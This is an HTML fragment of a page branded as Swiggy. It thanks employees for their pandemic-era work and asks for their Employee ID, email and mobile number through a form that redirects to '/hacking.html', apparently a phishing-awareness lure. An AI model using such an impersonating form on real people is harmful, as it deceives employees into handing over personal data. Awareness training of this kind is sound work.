  ...
  <div class="w-row">
    <div class="column-2 w-col w-col-6"><img src="images/Swiggy.svg" loading="lazy" alt="">
      ...
      <div class="container w-container">
        <div class="w-form">
          <form id="email-form" name="email-form" data-name="Email Form" method="post" redirect="/hacking.html" data-redirect="/hacking.html">
            <label for="name" class="field-label">Employee ID</label>
            <input type="text" class="text-field w-input" maxlength="256" name="name" data-name="Name" placeholder="" id="empid">
            <label for="name-3" class="field-label">Email Address</label>
            <input type="text" class="text-field w-input" maxlength="256" name="name-2" data-name="Name 2" placeholder="" id="phno">
            <label for="email" class="field-label-2">Mobile No.</label>
            <input type="email" class="w-input" maxlength="256" name="email" data-name="Email" placeholder="" id="emailid" required="">
    ...
    <div class="column w-col w-col-6">
      <h1 class="heading-2">What a year it’s been! You’ve worked so hard during the pandemic for us.</h1><img src="images/success-1.png" loading="lazy" alt="" class="image-2">
